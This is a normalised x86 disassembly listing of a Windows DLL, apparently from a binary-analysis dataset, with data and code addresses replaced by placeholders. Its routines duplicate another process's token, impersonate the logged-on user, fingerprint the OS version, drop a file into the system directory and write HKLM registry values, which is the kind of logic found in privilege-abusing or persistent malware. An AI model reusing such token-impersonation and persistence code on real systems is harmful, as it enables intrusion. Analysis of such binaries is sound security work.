mov edi eax
call sub_1000c298
mov eax esi
call sub_1000c057
mov eax [ ebp + 0x8 ]
pop edi
pop esi
leave
retn 0x4
sub_1000c30b
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
push ebx
push esi
push edi
mov edi [ eax ]
test edi edi
jne r-xdata
mov esi [ wcschr@IAT ]
mov ebx r--data
jmp r-xdata
mov edi r--data
movzx eax [ edi ]
push eax
push ebx
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
add edi 0x2
and [ ebp - 0xc ] 0x0
movzx eax [ edi ]
push eax
push ebx
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
add edi 0x2
cmp [ edi ] 0x0
mov ecx edi
jmp r-xdata
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov eax [ ebp - 0x14 ]
test ax ax
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
cmp [ ecx ] ax
jne r-xdata
movzx eax [ ecx ]
cmp eax 0x22
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] eax
jne r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
add ecx 0x2
cmp [ ecx ] 0x0
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x14 ] eax
jmp r-xdata
cmp eax 0x27
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
leave
retn 0xc
movzx eax [ edi ]
cmp eax 0x22
je r-xdata
inc [ ebp - 0xc ]
mov edi [ ebp - 0x8 ]
jmp r-xdata
push eax
push ebx
call esi
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
test eax eax
jne r-xdata
push eax
add edi 0x2
push edi
call esi
pop ecx
pop ecx
mov [ ebp + 0xc ] eax
mov ecx edi
test eax eax
je r-xdata
cmp eax 0x27
je r-xdata
and [ ebp - 0x14 ] 0x0
jmp r-xdata
jmp r-xdata
mov ebx [ ebp - 0x8 ]
cmp ecx ebx
jae r-xdata
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
test eax eax
jne r-xdata
cmp eax [ ebp - 0x8 ]
ja r-xdata
mov ebx ecx
push ecx
sub ebx edi
push ecx
sub edi eax
mov esi esp
mov [ ebp + 0xc ] esp
sar edi 0x1
push edi
push [ ebp + 0x8 ]
sar ebx 0x1
call sub_1000c1e9
mov esi [ ebp + 0x10 ]
call sub_1000c108
jmp r-xdata
mov eax r--data
sub ebx ecx
sub ecx eax
sar ecx 0x1
push ecx
push [ ebp + 0x8 ]
sar ebx 0x1
lea esi [ ebp - 0x18 ]
call sub_1000c1e9
mov edi [ ebp + 0x10 ]
push eax
call sub_1000c167
mov eax esi
call sub_1000c057
mov eax r--data
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
test edx edx
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov ebx eax
sub ebx ecx
sub ecx edx
sar ecx 0x1
push ecx
push [ ebp + 0x8 ]
sar ebx 0x1
lea esi [ ebp - 0x18 ]
call sub_1000c1e9
mov edi [ ebp + 0x10 ]
push eax
call sub_1000c167
mov eax esi
call sub_1000c057
mov ecx [ ebp + 0xc ]
add ecx 0x2
mov [ ebp - 0x10 ] 0x1
mov edx r--data
sub_1000c4ad
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp ebx 0x100
jb r-xdata
mov [ esi ] bl
mov [ esi + 0x1 ] 0x0
jmp r-xdata
mov edi [ htonl@IAT ]
lea eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
pop edi
pop esi
pop ebx
leave
retn
shl ebx 0x10
push ebx
call edi
push ebx
mov [ esi ] al
call edi
shr eax 0x8
mov [ esi + 0x1 ] al
mov [ esi + 0x2 ] 0x0
jmp r-xdata
cmp ebx 0x1000000
jb r-xdata
shl ebx 0x8
push ebx
call edi
push ebx
mov [ esi ] al
call edi
shr eax 0x8
push ebx
mov [ esi + 0x1 ] al
call edi
shr eax 0x10
mov [ esi + 0x2 ] al
mov [ esi + 0x3 ] 0x0
push ebx
call edi
push ebx
mov [ esi ] al
call edi
shr eax 0x8
push ebx
mov [ esi + 0x1 ] al
call edi
shr eax 0x10
push ebx
mov [ esi + 0x2 ] al
call edi
add [ ebp - 0x4 ] 0x4
shr eax 0x18
mov [ esi + 0x3 ] al
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
add esi 0x4
cmp ebx 0x100
jae r-xdata
cmp ebx 0x10000
jb r-xdata
sub_1000c554
push ebp
mov ebp esp
sub esp 0x10
fld [ r--data ]
push esi
xor esi esi
fstp [ ebp - 0x10 ]
push esi
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x20019
push esi
push esi
push esi
push r--data
push 0x80000002
call [ RegCreateKeyExW@IAT ]
test eax eax
jne r-xdata
fld [ ebp - 0x10 ]
pop esi
leave
retn
push edi
lea eax [ ebp - 0x8 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
push esi
mov esi [ RegQueryValueExW@IAT ]
mov edi r--data
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
pop edi
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebx
push [ ebp - 0x8 ]
call [ malloc@IAT ]
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
pop ebx
lea eax [ ebp - 0x8 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
push eax
push 0x0
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push ebx
call [ free@IAT ]
pop ecx
mov esi [ wcschr@IAT ]
push 0x2e
pop edi
push edi
push ebx
call esi
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
call [ _wtof@IAT ]
fstp [ ebp - 0x10 ]
pop ecx
push edi
push ebx
call esi
push edi
push eax
call esi
add esp 0x10
test eax eax
je r-xdata
push edi
push ebx
call esi
push edi
push eax
call esi
add esp 0x10
xor ecx ecx
mov [ eax ] cx
sub_1000c62e
push ebp
mov ebp esp
sub esp 0x1b4
and [ ebp - 0x8 ] 0x0
push ebx
mov ebx [ GetModuleHandleA@IAT ]
push esi
push edi
mov esi r--data
push esi
call ebx
mov edi eax
test edi edi
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_10004e87
pop ecx
test eax eax
je r-xdata
push esi
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
xor eax eax
push r--data
push edi
call [ GetProcAddress@IAT ]
xor esi esi
cmp eax esi
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
push [ ebp - 0x8 ]
call eax
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x2
push esi
push 0x2000000
push [ ebp - 0x10 ]
call [ DuplicateTokenEx@IAT ]
push [ ebp - 0x10 ]
test eax eax
jne r-xdata
mov edi [ CloseHandle@IAT ]
call edi
lea eax [ ebp - 0xc ]
push eax
push esi
push esi
mov esi [ GetTokenInformation@IAT ]
push 0x1
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
call [ CloseHandle@IAT ]
jmp r-xdata
push [ ebp - 0x4 ]
call edi
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push [ ebp - 0xc ]
call [ malloc@IAT ]
mov edi eax
pop ecx
test edi edi
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0xc ]
push edi
push 0x1
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
jmp r-xdata
push 0x32
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x74 ]
push eax
push [ edi ]
push 0x0
call [ LookupAccountSidA@IAT ]
push edi
test eax eax
je r-xdata
push edi
call [ free@IAT ]
pop ecx
jmp r-xdata
call [ free@IAT ]
pop ecx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x1b0 ] 0x0
mov [ ebp - 0xc ] 0x104
call [ GetUserProfileDirectoryA@IAT ]
push 0x20
pop esi
push esi
lea eax [ ebp - 0x3c ]
push 0x0
push eax
call [ memset@IAT ]
lea eax [ ebp - 0x74 ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x1b0 ]
add esp 0xc
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] 0x1
call [ LoadUserProfileA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x20 ]
mov esi 0x80000001
push esi
call [ RegOverridePredefKey@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push 0x0
push 0x80000001
call [ RegOverridePredefKey@IAT ]
jmp r-xdata
push [ ebp - 0x4 ]
call [ ImpersonateLoggedOnUser@IAT ]
test eax eax
jne r-xdata
cmp eax 0x6
jne r-xdata
lea eax [ ebp - 0x1b0 ]
push eax
push r--data
call [ SetEnvironmentVariableA@IAT ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
push eax
push esi
call [ RegOverridePredefKey@IAT ]
push [ ebp - 0x20 ]
push [ ebp - 0x4 ]
call [ UnloadUserProfile@IAT ]
push [ ebp - 0x20 ]
jmp r-xdata
push [ ebp - 0x20 ]
mov esi 0x80000001
push esi
call [ RegOverridePredefKey@IAT ]
test eax eax
je r-xdata
call sub_10004af3
and eax 0xffff0000
cmp eax 0x6000000
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x20 ]
push [ ebp - 0x4 ]
call [ UnloadUserProfile@IAT ]
jmp r-xdata
push r--data
call ebx
mov ecx 0x200000
push r--data
call ebx
mov ecx 0x1000000
jmp r-xdata
add ecx eax
mov edi eax
mov [ ebp - 0x1c ] ecx
cmp eax ecx
jae r-xdata
test eax eax
je r-xdata
mov ebx 0x80
add edi 0x4
cmp edi [ ebp - 0x1c ]
jb r-xdata
and [ ebp - 0x8 ] eax
lea esi [ edi + 0xc ]
push ebx
push edi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
push [ esi - 0x4 ]
call [ IsBadCodePtr@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x1
jne r-xdata
inc [ ebp - 0x8 ]
add esi 0x10
cmp [ ebp - 0x8 ] 0x8
jl r-xdata
cmp [ esi - 0xc ] 0x0
jne r-xdata
push ebx
push edi
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
and [ edi + 0x1c ] 0x0
sub_1000c905
mov eax sub_1000fd25
call sub_1000fbf4
sub esp 0x17c
push ebx
push esi
push edi
call [ RevertToSelf@IAT ]
xor esi esi
push esi
push 0x80000001
call [ RegOverridePredefKey@IAT ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ UnloadUserProfile@IAT ]
push [ ebp + 0x8 ]
call [ CloseHandle@IAT ]
mov ebx [ GetCurrentProcess@IAT ]
push 0xfa
lea eax [ ebp - 0x188 ]
push eax
push esi
call ebx
push eax
call [ GetModuleBaseNameA@IAT ]
call sub_10004af3
and eax 0xffff0000
cmp eax 0x6000000
jb r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x8
call ebx
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x188 ]
push r--data
push eax
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
push [ ebp - 0x20 ]
mov [ ebp - 0x10 ] 0x64
call [ GetUserProfileDirectoryA@IAT ]
test eax eax
je r-xdata
push r--data
mov [ ebp - 0x18 ] esi
call [ LoadLibraryA@IAT ]
mov edi eax
mov [ ebp - 0x1c ] edi
cmp edi esi
je r-xdata
lea eax [ ebp - 0x88 ]
push eax
push r--data
call [ SetEnvironmentVariableA@IAT ]
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x18 ] esi
je r-xdata
push r--data
push edi
call [ GetProcAddress@IAT ]
push 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] esi
xor eax eax
pop ecx
cmp edi esi
je r-xdata
call [ ebp - 0x18 ]
mov dl [ ebp + eax - 0xd ]
mov [ ebp + eax - 0x11 ] dl
dec eax
dec ecx
jne r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
push edi
call [ FreeLibrary@IAT ]
sub_1000ca2f
push ebp
mov ebp esp
sub esp 0x1b4
push ebx
push esi
push edi
xor edi edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
xor esi esi
xor eax eax
push edi
push esi
push eax
push 0x5
call [ ZwQuerySystemInformation@IAT ]
cmp eax 0xc0000004
je r-xdata
add esi 0x1000
push esi
push [ ebp - 0x8 ]
call [ realloc@IAT ]
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
je r-xdata
cmp eax edi
jge r-xdata
mov esi [ ebp - 0x8 ]
mov ebx [ wcslen@IAT ]
mov edi r--data
push [ ebp - 0x8 ]
call [ free@IAT ]
pop ecx
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push edi
call ebx
pop ecx
movzx ecx [ esi + 0x38 ]
add eax eax
cmp ecx eax
jne r-xdata
add esi eax
jne r-xdata
push edi
call ebx
push eax
push [ esi + 0x3c ]
push edi
call [ _wcsnicmp@IAT ]
add esp 0x10
test eax eax
je r-xdata
cmp [ esi + 0x3c ] 0x0
je r-xdata
jmp r-xdata
push [ ebp - 0x8 ]
mov edi [ free@IAT ]
mov esi [ esi + 0x44 ]
call edi
xor ebx ebx
pop ecx
cmp esi ebx
je r-xdata
push esi
push ebx
push 0x400
call [ OpenProcess@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0xf01ff
push esi
call [ OpenProcessToken@IAT ]
push esi
test eax eax
jne r-xdata
mov esi [ CloseHandle@IAT ]
call esi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x2
push ebx
push 0x2000000
push [ ebp - 0x10 ]
call [ DuplicateTokenEx@IAT ]
push [ ebp - 0x10 ]
test eax eax
je r-xdata
call [ CloseHandle@IAT ]
jmp r-xdata
call esi
call esi
lea eax [ ebp - 0xc ]
push eax
push ebx
push ebx
push 0x1
push [ ebp - 0x4 ]
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push [ ebp - 0xc ]
call [ malloc@IAT ]
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0xc ]
push ebx
push 0x1
push [ ebp - 0x4 ]
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
push 0x32
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0xa4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push [ ebx ]
push 0x0
call [ LookupAccountSidA@IAT ]
push ebx
test eax eax
je r-xdata
push ebx
call edi
pop ecx
call edi
pop ecx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] 0x104
call [ GetUserProfileDirectoryA@IAT ]
push 0x20
pop edi
push edi
lea eax [ ebp - 0x38 ]
push 0x0
push eax
call [ memset@IAT ]
lea eax [ ebp - 0x70 ]
add esp 0xc
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x38 ]
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x34 ] 0x1
call [ LoadUserProfileA@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x1c ]
mov edi [ RegOverridePredefKey@IAT ]
mov ebx 0x80000001
push ebx
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ ImpersonateLoggedOnUser@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x4 ]
call [ UnloadUserProfile@IAT ]
jmp r-xdata
lea eax [ ebp - 0x1b0 ]
push eax
push r--data
call [ SetEnvironmentVariableA@IAT ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1c ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
push eax
push ebx
call edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1000cc81
push ebp
mov ebp esp
sub esp 0x1c0
push esi
mov esi [ memset@IAT ]
push edi
push 0x24
lea eax [ ebp - 0x100 ]
push 0x0
push eax
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x1c0 ] 0x0
mov [ ebp - 0x140 ] 0x0
mov [ ebp - 0x180 ] 0x0
call esi
mov edi 0x9c
push edi
lea eax [ ebp - 0xdc ]
push 0x0
push eax
call esi
add esp 0x18
lea eax [ ebp - 0xdc ]
push eax
mov [ ebp - 0xdc ] edi
call [ GetVersionExA@IAT ]
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x100 ]
push eax
call [ GetSystemInfo@IAT ]
lea ecx [ ebp - 0x100 ]
push ecx
call eax
jmp r-xdata
cmp [ ebp - 0x100 ] di
jne r-xdata
push r--data
jmp r-xdata
cmp [ ebp - 0x100 ] 0x9
mov esi [ strcpy@IAT ]
push 0x6
pop edi
jne r-xdata
cmp [ ebp - 0x100 ] 0x5
jne r-xdata
push r--data
jmp r-xdata
lea eax [ ebp - 0x140 ]
push eax
call esi
pop ecx
pop ecx
mov eax [ ebp - 0xcc ]
sub eax 0x0
je r-xdata
push r--data
push r--data
dec eax
je r-xdata
cmp [ ebp - 0x140 ] 0x0
je r-xdata
push ebx
call edi
push 0x40
pop ecx
sub ecx eax
push ecx
push r--data
push ebx
call esi
push ebx
mov [ ebx + 0x3f ] 0x0
call edi
push 0x40
pop ecx
sub ecx eax
push ecx
lea eax [ ebp - 0x1c0 ]
push eax
push ebx
call esi
add esp 0x20
mov [ ebx + 0x3f ] 0x0
cmp [ ebp - 0xd8 ] 0x4
jne r-xdata
dec eax
jne r-xdata
cmp [ ebp - 0x180 ] 0x0
je r-xdata
push ebx
call edi
push 0x40
pop ecx
sub ecx eax
push ecx
push r--data
push ebx
call esi
push ebx
mov [ ebx + 0x3f ] 0x0
call edi
push 0x40
pop ecx
sub ecx eax
push ecx
lea eax [ ebp - 0x140 ]
push eax
push ebx
call esi
add esp 0x20
mov [ ebx + 0x3f ] 0x0
push 0x40
lea eax [ ebp - 0x40 ]
push eax
push ebx
call [ strncpy@IAT ]
mov esi [ strncat@IAT ]
mov edi [ strlen@IAT ]
add esp 0xc
cmp [ ebp - 0x1c0 ] 0x0
mov [ ebx + 0x3f ] 0x0
je r-xdata
cmp [ ebp - 0xd4 ] 0x0
jne r-xdata
cmp [ ebp - 0xd8 ] edi
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
call edi
push 0x40
pop ecx
sub ecx eax
push ecx
push r--data
push ebx
call esi
push ebx
mov [ ebx + 0x3f ] 0x0
call edi
push 0x40
pop ecx
sub ecx eax
push ecx
lea eax [ ebp - 0x180 ]
push eax
push ebx
call esi
add esp 0x20
mov [ ebx + 0x3f ] 0x0
cmp [ ebp - 0xd4 ] 0xa
jne r-xdata
lea eax [ ebp - 0x40 ]
push r--data
push eax
call esi
cmp [ ebp - 0xc7 ] 0x43
pop ecx
pop ecx
je r-xdata
cmp [ ebp - 0xd8 ] 0x5
jne r-xdata
cmp [ ebp - 0xd4 ] 0x1
jne r-xdata
cmp [ ebp - 0xd4 ] 0x5a
jne r-xdata
lea eax [ ebp - 0x40 ]
push r--data
push eax
call esi
cmp [ ebp - 0xc7 ] 0x41
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x40 ]
push r--data
push eax
call esi
pop ecx
pop ecx
cmp [ ebp - 0xc7 ] 0x42
jne r-xdata
cmp [ ebp - 0xd8 ] 0x4
ja r-xdata
cmp [ ebp - 0xd4 ] 0x2
mov edi r--data
jne r-xdata
cmp [ ebp - 0xd4 ] 0x0
jne r-xdata
cmp [ ebp - 0x42 ] 0x1
lea eax [ ebp - 0x40 ]
jne r-xdata
push r--data
jmp r-xdata
lea eax [ ebp - 0x40 ]
push r--data
push eax
call esi
pop ecx
pop ecx
cmp [ ebp - 0xc7 ] 0x42
jne r-xdata
cmp [ ebp - 0xd8 ] 0x4
jne r-xdata
movzx eax [ ebp - 0xd0 ]
push eax
lea eax [ ebp - 0xbb ]
push eax
lea eax [ ebp - 0x180 ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0x10
jmp r-xdata
lea eax [ ebp - 0x40 ]
push r--data
push eax
call esi
pop ecx
pop ecx
cmp [ ebp - 0xd4 ] 0x1
jne r-xdata
push 0x59
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x42 ] 0x1
lea eax [ ebp - 0x40 ]
jne r-xdata
push r--data
push r--data
jmp r-xdata
lea eax [ ebp - 0x40 ]
push eax
call esi
pop ecx
pop ecx
cmp [ ebp - 0xd8 ] 0x4
jne r-xdata
cmp [ ebp - 0xd4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x40 ]
push edi
push eax
call esi
cmp [ ebp - 0xd8 ] 0x5
pop ecx
pop ecx
jne r-xdata
cmp [ ebp - 0x42 ] 0x1
jne r-xdata
push r--data
jmp r-xdata
push r--data
push r--data
jmp r-xdata
cmp [ ebp - 0xd4 ] 0x1
jne r-xdata
push eax
call esi
pop ecx
pop ecx
cmp [ ebp - 0xd8 ] edi
jne r-xdata
lea eax [ ebp - 0x40 ]
push r--data
push eax
call esi
pop ecx
pop ecx
push r--data
cmp [ ebp - 0x100 ] 0x9
jne r-xdata
lea eax [ ebp - 0x40 ]
push eax
call esi
cmp [ ebp - 0xd8 ] 0x5
pop ecx
pop ecx
jne r-xdata
push eax
call esi
pop ecx
pop ecx
cmp [ ebp - 0x42 ] 0x1
lea eax [ ebp - 0x40 ]
jne r-xdata
push edi
jmp r-xdata
push r--data
push r--data
jmp r-xdata
push eax
call esi
pop ecx
pop ecx
cmp [ ebp - 0xd8 ] edi
jne r-xdata
sub_1000d02d
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ RegCreateKeyA@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push r--data
push 0x80000002
mov [ ebp - 0x14 ] 0x2
mov [ ebp - 0xc ] 0x20
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push r--data
push [ ebp - 0x8 ]
call esi
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
push [ ebp - 0x8 ]
mov edi [ RegCloseKey@IAT ]
call edi
mov esi [ RegSetValueExA@IAT ]
push 0x4
pop ebx
push ebx
lea eax [ ebp - 0xc ]
push eax
push ebx
push 0x0
push r--data
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
jmp r-xdata
pop esi
leave
retn
push [ ebp - 0x4 ]
call edi
jmp r-xdata
and [ ebp - 0x10 ] eax
push ebx
lea eax [ ebp - 0x10 ]
push eax
push ebx
push 0x0
push r--data
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
xor eax eax
push ebx
lea eax [ ebp - 0x14 ]
push eax
push ebx
push 0x0
push r--data
push [ ebp - 0x4 ]
call esi
test eax eax
je r-xdata
mov edi [ strlen@IAT ]
mov ebx r--data
push ebx
call edi
pop ecx
push eax
push ebx
push 0x2
push 0x0
push r--data
push [ ebp - 0x4 ]
call esi
test [ ebp - 0xc ] 0x3
jne r-xdata
mov ebx r--data
push ebx
call edi
pop ecx
push eax
push ebx
push 0x2
push 0x0
push r--data
push [ ebp - 0x4 ]
call esi
xor esi esi
test eax eax
je r-xdata
mov ebx r--data
push ebx
call edi
pop ecx
push eax
push ebx
push 0x2
push 0x0
push r--data
push [ ebp - 0x4 ]
call esi
test eax eax
je r-xdata
inc esi
jmp r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
mov eax esi
jmp r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
pop edi
pop ebx
sub_1000d163
mov eax sub_1000fd13
call sub_1000fbf4
sub esp 0xa30
push ebx
xor eax eax
push esi
push edi
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov ebx 0x100
push ebx
lea eax [ ebp - 0x23c ]
push eax
call [ GetSystemDirectoryW@IAT ]
mov esi [ wcscat@IAT ]
lea eax [ ebp - 0x23c ]
push r--data
push eax
call esi
mov edi r--data
lea eax [ ebp - 0x23c ]
push edi
push eax
call esi
lea eax [ ebp - 0x23c ]
push r--data
push eax
call esi
lea eax [ ebp - 0x23c ]
push eax
push r--data
lea eax [ ebp - 0x63c ]
push ebx
push eax
call [ _snwprintf@IAT ]
push edi
push r--data
lea eax [ ebp - 0xa3c ]
push ebx
push eax
call [ _snwprintf@IAT ]
mov ebx [ wcscpy@IAT ]
lea eax [ ebp - 0x83c ]
push r--data
push eax
call ebx
add esp 0x40
lea eax [ ebp - 0x83c ]
push edi
push eax
call esi
lea eax [ ebp - 0x43c ]
push r--data
push eax
call ebx
lea eax [ ebp - 0x43c ]
push edi
push eax
call esi
mov esi [ GetModuleHandleA@IAT ]
add esp 0x18
push r--data
mov ebx r--data
push ebx
call esi
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push r--data
push ebx
call esi
push eax
call [ GetProcAddress@IAT ]
xor ebx ebx
push ebx
push 0x80
push 0x2
push ebx
push ebx
mov [ ebp - 0x28 ] eax
push __dos_header
lea eax [ ebp - 0x23c ]
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
cmp [ ebp - 0x14 ] 0x0
mov ebx [ RegCloseKey@IAT ]
je r-xdata
push ebx
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
call [ WriteFile@IAT ]
push esi
test eax eax
jne r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
push [ ebp - 0x14 ]
call ebx
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x18 ]
push eax
mov ebx r--data
push ebx
mov esi 0x80000002
push esi
call [ RegOpenKeyW@IAT ]
test eax eax
je r-xdata
call [ CloseHandle@IAT ]
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
and [ ebp - 0x28 ] 0x0
push r--data
call [ LoadLibraryA@IAT ]
mov esi eax
mov [ ebp - 0x2c ] esi
test esi esi
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push edi
push [ ebp - 0x18 ]
call [ RegOpenKeyW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
push esi
call [ RegCreateKeyW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x23c ]
push eax
call [ DeleteFileW@IAT ]
mov eax [ ebp - 0x30 ]
push [ ebp - 0x18 ]
call ebx
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
mov [ ebp - 0x24 ] eax
xor eax eax
push 0x4
mov [ ebp - 0x20 ] eax
pop ecx
mov esi [ RegSetValueExA@IAT ]
push 0x4
lea eax [ ebp - 0x1c ]
push eax
push 0x4
xor ebx ebx
push ebx
push r--data
push [ ebp - 0x14 ]
mov [ ebp - 0x1c ] 0x1
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push edi
push [ ebp - 0x18 ]
call [ RegCreateKeyW@IAT ]
test eax eax
jne r-xdata
test esi esi
je r-xdata
push edi
push [ ebp - 0x18 ]
call [ ebp - 0x28 ]
mov dl [ ebp + eax - 0x21 ]
mov [ ebp + eax - 0x1d ] dl
dec eax
dec ecx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
push 0x4
lea eax [ ebp - 0x1c ]
push eax
push 0x4
push ebx
push r--data
push [ ebp - 0x14 ]
mov [ ebp - 0x1c ] ebx
call esi
test eax eax
jne r-xdata
mov [ ebp - 0x20 ] 0x1
push esi
call [ FreeLibrary@IAT ]
push 0x4
lea eax [ ebp - 0x1c ]
push eax
push 0x4
push ebx
push r--data
push [ ebp - 0x14 ]
